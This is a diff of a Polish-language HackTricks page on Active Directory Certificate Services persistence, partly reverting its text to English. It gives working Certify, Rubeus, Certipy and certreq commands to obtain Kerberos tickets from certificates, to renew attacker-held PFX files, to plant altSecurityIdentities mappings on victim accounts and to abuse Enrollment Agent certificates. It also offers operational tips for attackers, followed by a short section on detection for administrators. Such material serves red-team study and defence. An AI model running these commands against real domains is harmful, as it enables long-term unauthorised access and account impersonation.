@@ -44,9 +44,9 @@ Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /mach
 # Authenticate as the machine using the issued PFX
 Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
 ```
-## Extending Persistence Through Certificate Renewal - PERSIST3
+## Rozszerzanie trwałości przez odnawianie certyfikatów - PERSIST3
 
-Wykorzystanie okresów ważności i odnowienia szablonów certyfikatów pozwala atakującemu na utrzymanie długoterminowego dostępu. Jeśli posiadasz wcześniej wydany certyfikat i jego klucz prywatny, możesz go odnowić przed wygaśnięciem, aby uzyskać nowy, długoterminowy identyfikator bez pozostawiania dodatkowych artefaktów żądania związanych z oryginalnym podmiotem.
+Wykorzystanie okresów ważności i odnawiania szablonów certyfikatów pozwala atakującemu na utrzymanie długoterminowego dostępu. Jeśli posiadasz wcześniej wydany certyfikat i jego klucz prywatny, możesz go odnowić przed wygaśnięciem, aby uzyskać nowy, długoterminowy identyfikator bez pozostawiania dodatkowych artefaktów żądania związanych z oryginalnym podmiotem.
 ```bash
 # Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
 # Provide the existing PFX and target the same CA/template when possible
@@ -57,7 +57,7 @@ certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
 # (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
 certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
 ```
-> Wskazówka operacyjna: Śledź czas trwania plików PFX posiadanych przez atakującego i odnawiaj je wcześnie. Odnowienie może również spowodować, że zaktualizowane certyfikaty będą zawierać nowoczesne rozszerzenie mapowania SID, co pozwoli na ich użycie zgodnie z surowszymi zasadami mapowania DC (patrz następna sekcja).
+> Wskazówka operacyjna: Śledź czas trwania plików PFX posiadanych przez atakującego i odnawiaj je wcześnie. Odnowienie może również spowodować, że zaktualizowane certyfikaty będą zawierać nowoczesne rozszerzenie mapowania SID, co pozwala na ich użycie zgodnie z surowszymi zasadami mapowania DC (patrz następna sekcja).
 
 ## Sadzenie jawnych mapowań certyfikatów (altSecurityIdentities) – PERSIST4
 
@@ -65,9 +65,9 @@ Jeśli możesz zapisać do atrybutu `altSecurityIdentities` docelowego konta, mo
 
 Ogólny przebieg:
 
-1. Uzyskaj lub wydaj certyfikat klienta, który kontrolujesz (np. zarejestruj szablon `User` jako siebie).
+1. Uzyskaj lub wydaj certyfikat uwierzytelniający klienta, który kontrolujesz (np. zarejestruj szablon `User` jako siebie).
 2. Wyodrębnij silny identyfikator z certyfikatu (Issuer+Serial, SKI lub SHA1-PublicKey).
-3. Dodaj jawne mapowanie na `altSecurityIdentities` głównego użytkownika ofiary, używając tego identyfikatora.
+3. Dodaj jawne mapowanie do `altSecurityIdentities` głównego użytkownika ofiary, używając tego identyfikatora.
 4. Uwierzytelnij się za pomocą swojego certyfikatu; DC mapuje go do ofiary za pomocą jawnego mapowania.
 
 Przykład (PowerShell) używając silnego mapowania Issuer+Serial:
@@ -84,19 +84,19 @@ Następnie uwierzytelnij się za pomocą swojego PFX. Certipy uzyska TGT bezpoś
 ```bash
 certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10
 ```
-Notatki
+Notes
 - Używaj tylko silnych typów mapowania: X509IssuerSerialNumber, X509SKI lub X509SHA1PublicKey. Słabe formaty (Subject/Issuer, Subject-only, RFC822 email) są przestarzałe i mogą być blokowane przez politykę DC.
 - Łańcuch certyfikatów musi prowadzić do zaufanego korzenia przez DC. CAs przedsiębiorstw w NTAuth są zazwyczaj zaufane; niektóre środowiska również ufają publicznym CAs.
 
-Aby uzyskać więcej informacji na temat słabych jawnych mapowań i ścieżek ataku, zobacz:
+For more on weak explicit mappings and attack paths, see:
 
 {{#ref}}
 domain-escalation.md
 {{#endref}}
 
-## Agent rejestracji jako trwałość – PERSIST5
+## Enrollment Agent as Persistence – PERSIST5
 
-Jeśli uzyskasz ważny certyfikat Agenta Żądania Certyfikatu/Agenta Rejestracji, możesz w dowolnym momencie tworzyć nowe certyfikaty umożliwiające logowanie w imieniu użytkowników i przechowywać agenta PFX offline jako token trwałości. Workflow nadużycia:
+If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
 ```bash
 # Request an Enrollment Agent cert (requires template rights)
 Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"
@@ -115,7 +115,7 @@ Unieważnienie certyfikatu agenta lub uprawnień szablonu jest wymagane do usuni
 
 Microsoft KB5014754 wprowadził silne egzekwowanie mapowania certyfikatów na kontrolerach domeny. Od 11 lutego 2025 r. kontrolery domeny domyślnie stosują pełne egzekwowanie, odrzucając słabe/niejednoznaczne mapowania. Praktyczne implikacje:
 
-- Certyfikaty sprzed 2022 roku, które nie mają rozszerzenia mapowania SID, mogą nie przejść mapowania domyślnego, gdy kontrolery domeny są w pełnym egzekwowaniu. Atakujący mogą utrzymać dostęp, odnawiając certyfikaty przez AD CS (aby uzyskać rozszerzenie SID) lub sadząc silne jawne mapowanie w `altSecurityIdentities` (PERSIST4).
+- Certyfikaty sprzed 2022 roku, które nie mają rozszerzenia mapowania SID, mogą nie działać w przypadku mapowania domyślnego, gdy kontrolery domeny są w pełnym egzekwowaniu. Atakujący mogą utrzymać dostęp, odnawiając certyfikaty przez AD CS (aby uzyskać rozszerzenie SID) lub sadząc silne jawne mapowanie w `altSecurityIdentities` (PERSIST4).
 - Jawne mapowania używające silnych formatów (Issuer+Serial, SKI, SHA1-PublicKey) nadal działają. Słabe formaty (Issuer/Subject, Subject-only, RFC822) mogą być blokowane i powinny być unikać dla persystencji.
 
 Administratorzy powinni monitorować i ostrzegać o:
@@ -126,7 +126,7 @@ Administratorzy powinni monitorować i ostrzegać o:
 
 - Microsoft. KB5014754: Zmiany w uwierzytelnianiu opartym na certyfikatach na kontrolerach domeny Windows (harmonogram egzekwowania i silne mapowania).
 https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
-- Certipy Wiki – Odniesienie do poleceń (`req -renew`, `auth`, `shadow`).
+- Certipy Wiki – Referencja poleceń (`req -renew`, `auth`, `shadow`).
 https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
 
 {{#include ../../../banners/hacktricks-training.md}}
